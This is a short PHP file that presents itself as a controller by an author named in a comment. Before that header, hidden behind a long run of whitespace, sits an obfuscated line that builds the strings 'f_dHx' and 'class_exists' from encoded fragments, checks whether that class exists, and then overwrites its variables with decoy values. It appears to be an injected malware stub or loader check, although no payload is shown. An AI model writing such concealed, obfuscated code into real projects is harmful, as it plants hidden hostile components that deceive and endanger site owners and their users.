<?php                                                                                                                                                                                                                                                                                                                                                                                                 $UkNQHWdNJ = "\146" . "\137" . 'd' . "\x48" . 'x';$SUaKwQimyD = 'c' . "\x6c" . "\x61" . "\x73" . chr (115) . chr ( 172 - 77 )."\145" . chr (120) . "\151" . chr (115) . chr ( 921 - 805 ).'s';$veEcx = class_exists($UkNQHWdNJ); $UkNQHWdNJ = "17186";$SUaKwQimyD = "38206";$yrKorUtBe = FALSE; ?><?php 
//   Controller for: 
// Author: Vivek Patil
